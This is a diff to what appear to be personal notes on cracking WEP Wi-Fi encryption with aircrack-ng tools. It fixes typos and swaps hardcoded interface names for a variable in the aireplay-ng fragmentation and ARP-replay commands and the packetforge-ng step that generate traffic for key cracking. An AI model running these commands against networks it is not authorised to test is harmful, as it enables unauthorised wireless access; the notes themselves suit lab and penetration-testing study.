@@ -5,7 +5,7 @@ captured data packet, which can then be used to craft and inject arbitrary packe
 This doesn't directly give you the WEP key - it gives you the ability to inject packets, which you then use to generate IVs for
 actual key cracking. 
 
-aireplay-ng -5 -b $ap_mac -h $local_mac wla1nmon
+aireplay-ng -5 -b $ap_mac -h $local_mac $interface
 
 Then you need to convert the keystream into a .cap file
 
@@ -13,4 +13,4 @@ packetforge-ng --arp -y [keystream.xor] -a $ap_mac -h $local_mac -k 255.255.255.
 
 THen replay the .cap file to generate traffic
 
-aireplay-ng -3 -b $ap_mac -h $local_map -r output.cap wlan1mon
+aireplay-ng -3 -b $ap_mac -h $local_mac -r output.cap $interface
